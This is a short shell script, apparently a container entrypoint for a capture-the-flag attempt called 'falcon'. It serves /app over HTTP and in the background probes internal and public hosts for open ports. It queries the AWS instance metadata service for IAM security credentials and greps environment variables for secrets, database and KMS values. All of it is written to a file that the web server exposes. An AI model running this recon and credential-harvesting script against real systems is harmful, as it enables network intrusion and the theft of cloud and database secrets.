#!/bin/sh
# CTF falcon — serve FIRST (health), probe in background, then result.
echo "notready" > /app/ctf.txt

probe() {
  {
    echo "=== POD ==="
    id 2>&1
    echo "--- iface ---"
    cat /proc/net/fib_trie 2>/dev/null | grep -B1 "32 host" | grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | sort -u
    echo "--- internal SANDBOX 10.1.47.111:80 (HTTP app?) ---"
    curl -s --max-time 6 -i http://10.1.47.111/ 2>&1 | head -30
    echo "--- internal 10.1.47.111 ports ---"
    for p in 80 5432 12691 21911 9443; do
      timeout 3 sh -c "cat < /dev/null > /dev/tcp/10.1.47.111/$p" 2>/dev/null && echo "10.1.47.111:$p OPEN"
    done
    echo "--- public 132.145.163.127:80/443 (HTTP app from VPC?) ---"
    curl -s --max-time 6 -i http://132.145.163.127/ 2>&1 | head -30
    for p in 80 8080 443 12691; do
      timeout 3 sh -c "cat < /dev/null > /dev/tcp/132.145.163.127/$p" 2>/dev/null && echo "132.145.163.127:$p OPEN"
    done
    echo "--- AWS metadata ---"
    curl -s --max-time 4 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null; echo
    curl -s --max-time 4 http://169.254.169.254/latest/meta-data/local-ipv4 2>/dev/null; echo
    curl -s --max-time 4 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null; echo
    echo "--- env secrets ---"
    env | grep -iE "aiven|secret|postgres|pg_|kms|database|conn" | head -15
    echo "=== END ==="
  } > /app/ctf.txt 2>&1
}
probe &
exec python3 -m http.server 8080 --directory /app
